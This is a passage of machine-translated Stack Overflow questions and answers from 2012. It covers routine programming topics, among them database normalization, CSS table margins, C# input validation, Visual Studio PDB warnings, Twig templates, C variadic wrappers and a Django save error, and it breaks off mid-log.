在您的视图中尝试以下操作以检查每个的输出。当视图被第二次调用时，第一个更新。我的控制器使用键 ShowCreateButton 并具有带有默认值的可选参数 _createAction - 您可以将其更改为您的键/参数

```
@Html.TextBox("_createAction", null, new { Value = (string)ViewBag.ShowCreateButton })
@Html.TextBox("_createAction", ViewBag.ShowCreateButton )
@ViewBag.ShowCreateButton 
```

# database - 数据库可以在 2NF 中而不在 1NF 中吗？

> ID：12954808
> 
> 赞同：2
> 
> 时间：2012-10-18T12:34:52.473
> 
> 标签：database, theory

我有一个我想规范化的假设数据库。

我想达到所有的范式。

基本上，我的问题是：数据库可以在 2NF 中而不在 1NF 中吗？

例如：

*   成功进入 1NF
*   没有任何改变可以进入 2NF
*   成功进入 3NF

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:38:47.220

不，但原因是进入 2NF 的先决条件之一是进入 1NF。

> 一个表在 2NF 中**当且仅当它在 1NF 中**并且...

如果该细节不存在，可能是因为 1NF 与每个属性相关，而 2NF 与键相关。

# html - 不能在表格元素上使用负右边距？

> ID：12954811
> 
> 赞同：13
> 
> 时间：2012-10-18T12:35:11.757
> 
> 标签：html, css

我正在尝试在网格系统中使用表格单元格元素，该网格系统利用行上的负边距来消除嵌套网格元素上的左右排水沟。这适用于浮动和内联块元素，但带有的元素`display: table`在尊重负左边距的同时忽略负右边距：

![具有负右边距的表](../Images/76d8ce7e238ee1ff3df32a81f966c11a.png)

奇怪，嗯？一个简单的演示：http: [//jsfiddle.net/57FAN/1/](http://jsfiddle.net/57FAN/1/)

不幸的是，所有浏览器似乎都以相同的方式实现了这一点。有任何想法吗？

PS 让我们推迟关于布局的 table-* 元素的辩论，直到 flex box 标准化。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-18T12:47:04.700

该表格不会忽略负边距，但宽度仅为 100%，并且向左移动了 5px。您需要一个“100% + 2*5px”来完全填充灰色区域。

该行没有宽度，因此使用可用的整个宽度。

如果你会使用

```
.row {
  margin: 0 -5px;
  width: 100%;
} 
```

你会看到宽度相等

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-18T13:17:07.150

您的代码有更多`margin`和`padding`属性。所以它看起来像那样。在这里我更正了一些代码。

[**小提琴演示**](http://jsfiddle.net/57FAN/8/)

# box-api - 我可以动态设置“重定向网址”吗？

> ID：12954812
> 
> 赞同：0
> 
> 时间：2012-10-18T12:35:16.000
> 
> 标签：box-api

我有两个问题-

1）我需要根据我工作的服务器设置重定向 url，这意味着我需要能够动态更改重定向 url，有没有办法使用 API 设置重定向 url，而不是通过网站“www.box.com/developers/...”？

2）我今天遇到了一个奇怪的问题，我的应用程序打开了box.net“登录窗口”，当用户登录时重定向到指定的url，直到今天它都运行良好！但是现在“登录窗口”在用户登录时什么都不做，它没有响应。有什么改变了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-13T18:31:44.647

1）是的，你可以。在框应用程序控制台中，将您的应用程序的重定向 url 留空。然后只需要在运行时提供一个重定向 url，当您进行身份验证时（这可能是您已经在做的事情）。

2) 我目前无法重现该问题

# fpdf - 使用带有 eps 扩展名的 FPDF 时出现持续错误

> ID：12954813
> 
> 赞同：1
> 
> 时间：2012-10-18T12:35:25.423
> 
> 标签：fpdf, eps

我遇到了 fpdf 及其 eps 扩展名的问题，我似乎无法通过它。这就是我的代码的样子：

```
define('FPDF_FONTPATH','fpdf/font/');
require('fpdf/fpdf_eps.php');
$pdf = new PDF_EPS();
$pdf->AddPage();
$pdf->ImageEps("images/image.eps",50,100);
$pdf->AddPage();
$pdf->SetFont('Arial','B',14);
$pdf->MultiCell(0,5,"some text with multiple lines");
$pdf->Output("filname.pdf", "D"); 
```

这就是我不断得到的：

> **严格的标准：**只有变量应该在（...php 文件和行...）中通过引用传递
> 
> **FPDF 错误：**无法包含字体度量文件

任何帮助将不胜感激。

eps 扩展可以在这里找到：http: [//valentin.dasdeck.com/fpdf/fpdf_eps](http://valentin.dasdeck.com/fpdf/fpdf_eps)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T12:44:54.797

关于**严格标准：**只有变量应该在（...php 文件和行...）中通过引用传递

这意味着它所说的......您只能通过引用传递变量（函数定义中参数之前的 & 字符）。您可以丢失`&`或确保`error_reporting()`不包括`E_STRICT`，这将抑制此警告。（无论如何，php应该只复制你传递给该函数的任何内容，而不是交出对它的引用，这样我就不用担心了）

关于：**FPDF 错误：**无法包含字体度量文件

此错误与`SetFont()`. 字体路径中应该有Arial（或您要加载的任何字体）的`.ufm`or文件，以便 fpdf 可以加载和使用它们。`.afm`

# php - 带有 SSL 证书的网站

> ID：12954814
> 
> 赞同：0
> 
> 时间：2012-10-18T12:35:27.140
> 
> 标签：php, mysql, ssl, ssl-certificate, security

我当前创建的网站没有使用 ssl 证书。如果我决定为我的网站购买和使用 ssl 证书，我是否需要更改我网站上的任何代码？我的网站是用 html、php 编写的，它有一个 mysql 后端。

或者我可以只购买一个新的 ssl 证书而不更改任何代码吗？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T12:40:14.440

SSL 连接由 Web 服务器处理，在其上运行的代码与它无关。如果 Web 服务器配置合理，您的代码应该继续按原样运行。如果您正在使用`http://...`某处对链接进行硬编码，或者以其他方式取决于代码中是否存在 HTTP/HTTPS，则可能需要更改这些特定部分。

# c# - 显示哪些文本框为空白 C# 的错误消息

> ID：12954818
> 
> 赞同：0
> 
> 时间：2012-10-18T12:35:43.813
> 
> 标签：c#, validation, input

嘿，所以我的所有代码都在工作，这很好。但我想稍微清理一下。

目前我只有一个消息框显示输入是否有错误，所以它会显示“请检查您的输入”，但我希望它显示类似“请检查以下内容：名字，第二名等。”

```
if  ((FirstnameText.Text.Trim().Length == 0) || (SurnameText.Text.Trim().Length == 0)
    || (DateOfBirthText.Text.Trim().Length == 0) || (CourseText.Text.Trim().Length == 0)
    || (MatricNoText.Text.Trim().Length == 0) || (YearMarkText.Text.Trim().Length == 0)
    || (int.Parse(MatricNoText.Text) < 10000 || int.Parse(MatricNoText.Text) > 99999)
    || (int.Parse(YearMarkText.Text) < 0 ||  int.Parse(YearMarkText.Text) > 100))

   {
      errorMessage();
      return;
   }

public void errorMessage()
{
   MessageBox.Show("Please check your input");
} 
```

我知道这很乱，但是嘿，它有效

目前它只输出该消息，有没有一种简单的方法来输出有错误的特定文本框？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T14:38:07.487

内置的 ErrorProvider 组件将为您的情况创造奇迹。将它从工具箱拖到表单的设计器上。它将出现在底部，NotificationIcons 和 ContextMenuStrips 出现。ErrorProvider 的伟大之处在于它提供了一个视觉反馈图标，鼠标悬停在控件旁边的工具提示上。

然后，您可以使用控件的“验证”事件来检查您需要什么：

```
private void FirstnameText_Validating (object sender, CancelEventArgs e)
{
    string error = null;

    if (FirstnameText.Text.Length == 0)
    {
        error = "You must enter a First Name";
        e.Cancel = true; // This is important to keep focus in the box until the error is resolved.
    }

    ErrorProvider.SetError((Control)sender, error); // FirstnameText instead of sender to avoid unboxing the object if you care that much
} 
```

您也可以将其粘贴在“保存”按钮中，而不是在“验证”事件中引发它。要进一步清理代码，请创建一个验证输入的类，以将非 UI 内容排除在 UI 之外。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:39:58.570

拆分您的代码将是一个开始：

```
if  ((FirstnameText.Text.Trim().Length == 0){
   errorMessage("firstname is empty");
}

if (SurnameText.Text.Trim().Length == 0){
   errorMessage("surname is empty");
} 
```

明白了吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-18T12:45:59.743

**如果可能的话，你重写你的代码，如下所示**

```
Control errorControl =null;
foreach (Control ctrl in this.Controls)
{
  if (ctrl is TextBox)
  {
    if (ctrl.Name == "MatricNoText")
    {
      if ((int.Parse(MatricNoText.Text) < 10000 || int.Parse(MatricNoText.Text) > 99999))
          {
            errorControl = ctrl;
          }
     }
     else if (ctrl.Name == "MatricNoText")
     {
       if (int.Parse(YearMarkText.Text) < 0 || int.Parse(YearMarkText.Text) > 100)
       {
         errorControl = ctrl;
        }
      }
      else
      {
        if (ctrl.Text.Length == 0)
        {
          errorControl = ctrl;
         }
       }
    }
  }

MessageBox.Show("Please check your input." + errorControl.Focus()); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-18T12:50:10.347

我经常使用 Fluent Validation。该[`WithMessage`](http://fluentvalidation.codeplex.com/)方法允许您指定错误消息。然后，验证器会向您返回所有错误消息的可枚举。对于您的特定问题，可能还有更好的拟合方法。

# c++ - 在 Visual Studio C++ 2010 中找不到或打开 PDB 文件

> ID：12954821
> 
> 赞同：121
> 
> 时间：2012-10-18T12:35:49.917
> 
> 标签：c++, visual-studio-2010, pdb-files

我使用 Visual Studio 2010 C++ 并且我的项目构建没有错误，但是当我运行它时，我得到了这个。我在 Windows XP 上。

```
'Shaders.exe': Loaded 'C:\Documents and Settings\User\My Documents\Visual Studio        2010\Projects\Shaders\Win32\Debug\Shaders.exe', Symbols loaded.
'Shaders.exe': Loaded 'C:\WINDOWS\system32\ntdll.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\kernel32.dll', Cannot find or open the PDB  file
'Shaders.exe': Loaded 'C:\qt-everywhere-opensource-src-4.8.3\bin\QtCored4.dll', Symbols  loaded.
'Shaders.exe': Loaded 'C:\WINDOWS\system32\user32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\gdi32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\ole32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\advapi32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\rpcrt4.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\secur32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\msvcrt.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\ws2_32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\ws2help.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\msvcp100d.dll', Symbols loaded.
'Shaders.exe': Loaded 'C:\WINDOWS\system32\msvcr100d.dll', Symbols loaded.
'Shaders.exe': Loaded 'C:\qt-everywhere-opensource-src-4.8.3\bin\QtGuid4.dll', Symbols loaded.
'Shaders.exe': Loaded 'C:\WINDOWS\system32\comdlg32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\comctl32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\shell32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\shlwapi.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\oleaut32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\imm32.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\winmm.dll', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\WINDOWS\system32\winspool.drv', Cannot find or open the PDB file
'Shaders.exe': Loaded 'C:\qt-everywhere-opensource-src-4.8.3\bin\QtOpenGLd4.dll', Symbols loaded. 
```

谢谢

* * *

## 回答 #1

> 赞同：253
> 
> 时间：2012-10-18T12:39:50.323

PDB 是 Visual Studio 使用的调试信息文件。这些是系统 DLL，您没有调试符号。转到`Tools->Options->Debugging->Symbols`并选择复选框“Microsoft Symbol Servers”，Visual Studio 将自动下载 PDB。或者，如果您不需要在这些模块中看到正确的调用堆栈，您可以忽略这些警告。

* * *

## 回答 #2

> 赞同：51
> 
> 时间：2014-02-28T03:48:34.670

使用 VS 2013。
尝试以下工具 -> 选项 -> 调试 -> 输出窗口 -> 模块加载消息 -> 关闭

它将禁用加载模块的显示。

* * *

## 回答 #3

> 赞同：36
> 
> 时间：2017-05-31T19:31:05.680

保罗的回答是对的，我只是把视觉效果很容易到达那里。

转到工具->选项->调试->符号

设置标记为红色的复选框，它将从 microsoft 下载 pdb 文件。当您设置该复选框时，它还将在下面的编辑框中为 pdb 文件设置一个默认路径，您不需要更改它。

[![在此处输入图像描述](../Images/94c385a58fc242fab0a82d225e0a6582.png)](https://i.stack.imgur.com/nQdg2.png)

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2015-02-20T19:45:14.223

如果您的项目图中有多个项目，请在所有子项目中使用相同的硬编码 PathFile PDB 名称：

使用例如

```
D:\Visual Studio Projects\my_app\MyFile.pdb 
```

不要使用例如

```
$(IntDir)\MyFile.pdb 
```

在所有子项目中！！！

= 编译器参数 /Fd

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-05-06T19:26:11.397

我遇到了类似的问题，Visual Studio (2017) 说它找不到我项目的 PDB 文件。我可以看到 PDB 文件确实存在于正确的路径中。我必须清理并重建项目，然后 Visual Studio 识别出 PDB 文件并进行调试。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-08-15T09:05:19.967

如果您对工具、选项、调试、符号中配置的符号缓存目录没有*修改权限，也会发生这种情况。*

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2017-01-17T14:14:14.433

您只需将 .pdb 的路径添加到 VS 的工作目录！

# sql - Sql 查询为缺失数据填充 0

> ID：12954824
> 
> 赞同：3
> 
> 时间：2012-10-18T12:35:58.030
> 
> 标签：sql, sql-server, sql-server-2005, highcharts

要填充堆叠和分组的高图，我需要在我的数据中添加一些 0 值。我尝试过使用数字表，但无法弄清楚如何为每个日期缺失的每个员工添加 0。所以我有：

表（基准、员工、编号、堆栈）

```
2012-10-13 00:00:00.000 Nick    3   corporate
2012-10-14 00:00:00.000 Jack    1   private
2012-10-15 00:00:00.000 Yannick 1   corporate
2012-10-15 00:00:00.000 Jack    2   corporate 
```

我需要：

```
2012-10-13 00:00:00.000 Nick    3   corporate
2012-10-14 00:00:00.000 Nick    0   corporate
2012-10-15 00:00:00.000 Nick    0   corporate
2012-10-13 00:00:00.000 Jack    0   private
2012-10-14 00:00:00.000 Jack    1   private
2012-10-15 00:00:00.000 Jack    0   private
2012-10-13 00:00:00.000 Yannick 0   corporate
2012-10-14 00:00:00.000 Yannick 0   corporate
2012-10-15 00:00:00.000 Yannick 1   corporate
2012-10-13 00:00:00.000 Jack    0   corporate
2012-10-14 00:00:00.000 Jack    0   corporate
2012-10-15 00:00:00.000 Jack    2   corporate 
```

我需要使用光标还是有更好的技巧？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-18T13:08:41.287

```
 select dates.Datum, employees.Employee, isnull(tbl.Number,0), employees.Stack
      from (select distinct Datum from tbl) dates
cross join (select distinct Employee, Stack from tbl) employees
 left join tbl on tbl.Datum=dates.Datum and tbl.Employee = employees.Employee
                  and tbl.Stack = employees.Stack 
```

# javascript - 通过 javascript 将数据发布到数据库会导致编码问题

> ID：12954825
> 
> 赞同：0
> 
> 时间：2012-10-18T12:35:59.170
> 
> 标签：javascript, php, mysql, encoding

如果还有另一个类似的帖子，我很抱歉，但是很难用我的问题来正式提出一个问题。所以我有一个带有谷歌地图的页面和两个表格，可以在地图上添加带有额外信息的点。一种形式工作得很好，另一种不太好。我的语言是立陶宛语，所以我有一些特殊字符，例如“ `ąčęėįšųū`”，并且在提交后使用第二种形式，我在数据库中的值不正确，例如“ `%u0117%u0161`”。

![在此处输入图像描述](../Images/e2b2ca2e51672689c36d4ef22b488157.png)

在图像编号 1\. 中，这种形式运行良好。数字 2\. 是出现编码问题的表单，数字 3\. 是提交 2 号表单后的结果。

对于第二种形式，我使用了谷歌教程[（https://developers.google.com/maps/articles/phpsqlinfo_v3）](https://developers.google.com/maps/articles/phpsqlinfo_v3)，并编辑了一些小东西。

因此，如果有人能帮助我解决这个问题，我将不胜感激。

Javascript代码：

```
 function initMap() {
 map = new google.maps.Map(document.getElementById("map"), {
 zoom: 0,
 center: new google.maps.LatLng(55.203953, 24.873047),
 mapTypeId: google.maps.MapTypeId.ROADMAP,
 mapTypeControl: true,
 panControl: true,
 mapTypeControlOptions: {
 style: google.maps.MapTypeControlStyle.HORIZONTAL_BAR
 },
 navigationControl: true,
 navigationControlOptions: {
 style: google.maps.NavigationControlStyle.SMALL
 }
 }); 

 var html = "<table>" +
                 "<tr><td>Pavadinimas:</td> <td><input type='text' name='name' id='name'/> </td> </tr>" +
                 "<tr><td>Miestas:</td> <td><input type='text' name='city' id='city'/></td> </tr>" +
                 "<tr><td>Adresas:</td> <td><input type='text' name='adress' id='adress'/></td> </tr>" +
                 "<tr><td>Apibudinimas:</td> <td><input type='text' name='description' id='description'/></td> </tr>" +
                 "<tr><td>Type:</td> <td><select id='type'>" +
                 "<option value='Baras' SELECTED>Baras</option>" +
                 "<option value='Restoranas'>Restoranas</option>" +
                 "<option value='Degalinė'>Degalinė</option>" +
                 "</select> </td></tr>" +
                 "<tr><td></td><td><input type='button' value='Save & Close' onclick='saveData()'/></td></tr>";

    infowindow = new google.maps.InfoWindow({
     content: html
    });

    google.maps.event.addListener(map, "click", function(event) {
        marker = new google.maps.Marker({
          position: event.latLng,
          map: map
        });
        google.maps.event.addListener(marker, "click", function() {
          infowindow.open(map, marker);
        });
    });

 center = bounds.getCenter();
 map.fitBounds(bounds); 

  }

  function saveData() {
      var name = escape(document.getElementById("name").value);
      var adress = escape(document.getElementById("adress").value);
      var city = escape(document.getElementById("city").value);
      var description = escape(document.getElementById("description").value);
      var type = document.getElementById("type").value;
      var latlng = marker.getPosition();

      var url = "phpsqlinfo_addrow.php?name=" + name + "&adress=" + adress + "&city=" + city +
      "&description=" + description + "&type=" + type + "&lat=" + latlng.lat() + "&lon=" + latlng.lng();
      downloadUrl(url, function(data, responseCode) {
        if (responseCode == 200 && data.length <= 1) {
          infowindow.close();
          document.getElementById("message").innerHTML = "Location added.";
        }

      });

     $(document).ready(function() {
        setTimeout("ReloadPage()", 100);
        });

    }

      function downloadUrl(url, callback) {
      var request = window.ActiveXObject ?
          new ActiveXObject('Microsoft.XMLHTTP') :
          new XMLHttpRequest;

      request.onreadystatechange = function() {
        if (request.readyState == 4) {
          request.onreadystatechange = doNothing;
          callback(request.responseText, request.status);
        }
      };

      request.open('GET', url, true);
      request.send(null);

    }

    function ReloadPage() {
   location.reload();
};

    function doNothing() {} 
```

PHP插入代码：

```
require("controller/phpsqlinfo_dbinfo.php");

// Gets data from URL parameters
$name = $_GET['name'];

$adress = $_GET['adress'];

$city = $_GET['city'];

$description = $_GET['description'];

$lat = $_GET['lat'];

$lon = $_GET['lon'];

$type = $_GET['type'];

// Opens a connection to a MySQL server
$connection=mysql_connect ("localhost", $dbuser, $dbpass);
if (!$connection) {
  die('Not connected : ' . mysql_error());
}

// Set the active MySQL database
$db_selected = mysql_select_db($dbname, $connection);
if (!$db_selected) {
  die ('Can\'t use db : ' . mysql_error());
}

// Insert new row with user data

//$submit="INSERT INTO poi_example (id, name, city, adress, description, lat, lon, type) VALUES (NULL,'$name','$city', '$adress','$description','$lat','$lon','$type');";

$query = sprintf("INSERT INTO poi_example " .
         " (id, name, adress, city, description, lat, lon, type ) " .
         " VALUES (NULL, '%s', '%s', '%s', '%s', '%s', '%s', '%s');",
         mysql_real_escape_string($name),
         mysql_real_escape_string($adress),
          mysql_real_escape_string($city),
         mysql_real_escape_string($description),
         mysql_real_escape_string($lat),
         mysql_real_escape_string($lon),
         mysql_real_escape_string($type));

$result = mysql_query($query);

//print_r($result);

if (!$result) {
  die('Invalid query: ' . mysql_error());
}

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T12:48:01.400

您的（本地？）数据库是否可能未配置为使用正确的编码？我认为例如 UTF-8 可能更适合立陶宛语。我认为 MySQL 的标准编码类似于 latin1？这只是一个猜测，但您可能需要检查一下。

# c# - 将 combobox.selectedItem 转换为 int32 c#

> ID：12954828
> 
> 赞同：1
> 
> 时间：2012-10-18T12:36:20.680
> 
> 标签：c#

我的转换代码如下：

```
para = Int32.Parse(cmbCompany.SelectedItem.ToString()); 
```

我的组合框的数据绑定代码如下：

```
string query = "select CompanyID as ID, CompanyName as Name from tblCompany";
comb.ValueMember = "ID";
comb.DisplayMember = "Name";
comb.DataSource = ds.Tables[0]; 
```

当我运行上面的代码时，我得到一个转换错误：

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T12:38:01.430

使用 comboBox1.SelectedValue

```
 Int32.Parse(comboBox1.SelectedValue.ToString()); 
```

如果您希望组合为空值，则可以使用[**Int32.TryParse**](http://msdn.microsoft.com/en-us/library/f02979c7.aspx)

```
int number;
bool result = Int32.TryParse(comboBox1.SelectedValue.ToString(), out number);
if (result)
{
     //Your code
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T12:42:54.020

另一种技术是使用[Convert.ToInt32](http://msdn.microsoft.com/en-us/library/sf1aw27b.aspx)

```
Convert.ToInt32(comboBox1.SelectedValue); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-23T06:23:18.187

我的问题已解决。我执行以下操作

```
 Int32.Parse(((DataRowView)cmbCompany.SelectedItem).Row["ID"].ToString()); 
```

# php - symfony 每块都用 spaceless

> ID：12954829
> 
> 赞同：4
> 
> 时间：2012-10-18T12:36:27.823
> 
> 标签：php, html, symfony, twig

我如何用无空格包装每个块代码以从我的 twig/html 中裁剪空格

例如现在我有：

```
{% block content %}

    <div class="box clearfix clearall">
        <div class="ct colcontainer">
            <div class="col-1">
                <div class="chars">
                    <table class="layout data-char">
                        <thead>

blabla

{% endblock %} 
```

当 symfony 尝试渲染它时，我希望 symfony 看到

```
{% block content %}
{% spaceless %}
    <div class="box clearfix clearall">
        <div class="ct colcontainer">
            <div class="col-1">
                <div class="chars">
                    <table class="layout data-char">
                        <thead>

blabla
{% endspaceless %}
{% endblock %} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-22T10:41:56.760

## 定义自定义 Twig 标签（复制粘贴方式）

您可以定义一个自定义的 Twig 标签`spacelessblock`，它结合了[`block`](https://github.com/fabpot/Twig/blob/master/lib/Twig/Node/Block.php)和[`spaceless`](https://github.com/fabpot/Twig/blob/master/lib/Twig/Node/Spaceless.php)。然后你可以`{% spacelessblock xyz %}…{% endspacelessblock %}`在你的模板中使用。这是你如何快速而肮脏（复制和粘贴）的方式。

### 一个新的 Twig 节点

首先，定义一个类`Twig_Node_SpacelessBlock`（例如在`Extension`你的包的目录中）：

```
class Twig_Node_SpacelessBlock extends \Twig_Node_Block
{
    public function __construct($name, Twig_NodeInterface $body, $lineno, $tag = null)
    {
        parent::__construct(array('body' => $body), array('name' => $name), $lineno, $tag);
    }

    public function compile(Twig_Compiler $compiler)
    {
        // top part of Block.compile
        $compiler
            ->addDebugInfo($this)
            ->write(sprintf("public function block_%s(\$context, array \$blocks = array())\n", $this->getAttribute('name')), "{\n")
            ->indent()
        ;

        // the content of the body is treated like in Spaceless.compile
        $compiler
            ->write("ob_start();\n")
            ->subcompile($this->getNode('body'))
            ->write("echo trim(preg_replace('/>\s+</', '><', ob_get_clean()));\n")
        ;

        // bottom part of Block.compile
        $compiler
            ->outdent()
            ->write("}\n\n")
        ;
    }
} 
```

### 一个新的 Twig 令牌解析器

`{% spacelessblock xyz %}`每当 Twig在模板中找到 a 时，都需要在某处构建我们的新 Twig 节点。为此，我们需要一个令牌解析器，我们称之为`Twig_TokenParser_SpacelessBlock`. 我们基本上是复制粘贴[`Twig_TokenParser_Block`](https://github.com/fabpot/Twig/blob/master/lib/Twig/TokenParser/Block.php)：

```
class Twig_TokenParser_SpacelessBlock extends \Twig_TokenParser
{
    public function parse(Twig_Token $token)
    {
        // …
        $this->parser->setBlock($name, $block = new Twig_Node_SpacelessBlock($name, new Twig_Node(array()), $lineno));
        // …
    }

    public function decideBlockEnd(Twig_Token $token)
    {
        return $token->test('endspacelessblock');
    }

    public function getTag()
    {
        return 'spacelessblock';
    }
} 
```

### 告诉 Twig

在您的扩展类中：

```
class Extension extends \Twig_Extension
{
    public function getTokenParsers()
    {
        return array(
            new Twig_TokenParser_SpacelessBlock(),
        );
    }
} 
```

### 告诉 Symfony

如果尚未完成，请将以下内容添加到您的`services.yml`：

```
services:
    # …
    my.extension:
        class:     Acme\MyBundle\Extension\Extension
        tags:
          - { name: twig.extension } 
```

## 更好的选择

### 预处理器

更好的方法是使用预处理器来简单地替换

```
{% spacelessblock xyz %}
…
{% endspacelessblock %} 
```

经过

```
{% block xyz %}{% spaceless %}
…
{% endspaceless %}{% endblock %} 
```

它重用了 Twig 项目中已经编写的所有代码，包括可能的更改。

# c - C中具有可变参数的函数的包装器

> ID：12954830
> 
> 赞同：2
> 
> 时间：2012-10-18T12:36:33.097
> 
> 标签：c, variadic-functions

最近我想实现一个`printf`包装器。经过一番搜索，我发现这`vprintf`很适合这种需求：

```
void my_printf(const char *fmt, ...)
{
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
} 
```

`printf`但是是否有可能用可变参数而不是为任何其他类似的函数实现这样的包装器`va_list`？

（我的意思是，如果他们不提供`v`版本怎么办？）

* * *

由于一些评论者没有完全理解我的想法，我最好详细说明一下。

假设你有一个`printf`C 库中的普通函数。

有人给你一个`fmt`string`"%d %u %f"`和相应的输入。

现在您要编写一个类似于 的函数`printf`，但全部`%f`替换为`%.2f`。

当然你可以使用两条语句来完成任务：

```
replace(fmt, "%f", "%.2f");
printf(fmt, inputs); 
```

但是如果你多次使用这个函数，可能你想要一个包装器来节省一些时间。

当然，宏可以完成这项任务。但是没有宏是否可能，例如：

```
void myprintf(fmt, ...)
{
    replace(fmt, "%f", "%.2f");
    printf(fmt, inputs);
} 
```

这里的问题是你不知道如何`printf`用`...`.`myprintf`

希望这可以澄清。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-18T13:35:23.100

如果您只想使用它在输出之前添加一个字符串，您可以使用可变参数宏。

```
#define MYPRINT(...) printf("toto has: " __VA_ARGS__) 
```

在那个简单的例子中，这假设您传入的格式是字符串文字，所以这有点受限。但我希望你能看到如何使用这种简单的宏包装器的模式。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-18T12:44:24.703

当 API 不为您提供带`va_list`参数的函数时，没有可移植的方法来构造对可变参数函数的调用。

但是，您可以 [ab] 为此目的使用[libffi](http://sourceware.org/libffi/)，方法是构建可变参数调用并执行此操作。

# magento - Magento：将自己的管理模块操作的按钮添加到管理产品网格

> ID：12954839
> 
> 赞同：0
> 
> 时间：2012-10-18T12:36:53.070
> 
> 标签：magento

我可以向 Magento 管理网格添加按钮，并让该操作调用一些管理控制器操作。这一切都适用于我自己的模块，其中操作的语法是`*/*/action`，这将从同一个模块调用管理代码没问题

但是，我想在产品管理网格中添加一个按钮，并让它在我自己的模块中调用一些 adminhtml 操作。

添加按钮没问题，但是让它在我自己的模块中调用管理控制器操作对我不起作用。我可以使用 获取按钮来调用我自己的模块的前端操作`mymodule/index/action`，但是 adminhtml 操作并不那么容易。

有没有人有一个如何做到这一点的例子来分享？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-18T14:26:57.627

This code works for me:

```
<admin>
    <routers>
        <adminhtml>
            <args>
                <modules>
                    <module before="Mage_Adminhtml">Something_Adminhtml</module>
                </modules>
            </args>
        </adminhtml>
    </routers>
</admin>

$this->_addButton('module_controller', array(
        'label' => $this->__('Something Action'),
        'onclick' => "setLocation('{$this->getUrl('*/module/anyaction')}')",
    )); 
```

# django - 运行 Model.objects.get 的 Django 引发 DatabaseError

> ID：12954844
> 
> 赞同：2
> 
> 时间：2012-10-18T12:37:06.670
> 
> 标签：django, django-models, postgresql-9.1, tastypie

我正在使用 Django 1.4、postgres 9.1.x 和 Tastypie 0.9.11 创建 API。

我定义了以下模型：

```
class Activity(models.Model):
    company = models.ForeignKey(Company)
    opportunity = models.ForeignKey(Opportunity)
    name = models.CharField(max_length=200)
    ... 
```

我在这个过程中覆盖了“保存”方法来做一些特殊的事情：

```
def save(self, *args, **kwargs):
    saveResult = None
    try: 
        saveResult = super(Activity, self).save(*args, **kwargs)
    except IntegrityError, e:
        logger.error('IntegrityError %s' % e.message)

    if(not self.pk):
        try:
            self = Activity.objects.get(company_id=self.company.id,opportunity_id=self.opportunity.id)
        except ObjectDoesNotExist, e:
            pass
        except DatabaseError, e:
            logger.error('DatabaseError %s' % e.message)

    if(self.pk and not self.notified):
        send_notification(...)
        self.notified = 1
        self.save()

    return saveResult 
```

下面我描述了我正在执行的 POST 请求的示例：

```
curl --dump-header - -H "Content-Type: application/json" -X POST -d '{"company": {"id":10},"opportunity": {"id":39}}'  http://127.0.0.1:8001/api/v1/activity/ 
```

该过程对于新对象运行良好，但是当我对现有行执行 POST 请求时（我以前无法知道它是否是新对象），我当然会得到 IntegrityError 由于重复键错误，这是正确的。

然后，我想用存储在现有行中的信息填充自我数据，这就是我执行以下查询的原因（我没有找到更优雅的方法，如果您有更好的选择，将不胜感激）：

> 自我 = Activity.objects.get(company_id=self.company.id,opportunity_id=self.opportunity.id)

问题是进程正在死亡，因为“get”行抛出了一个 DatabaseError 消息“当前事务被中止，命令被忽略，直到事务块结束”避免获取现有对象。

这些是我在屏幕上打印的消息：

```
2012-10-18T04:57:27+00:00 app[web.1]: .............Saving new activity.............
2012-10-18T04:57:27+00:00 app[web.1]: Company: 10, video test | Opportunity: 39 | Activity: , created: None, None, 1, 
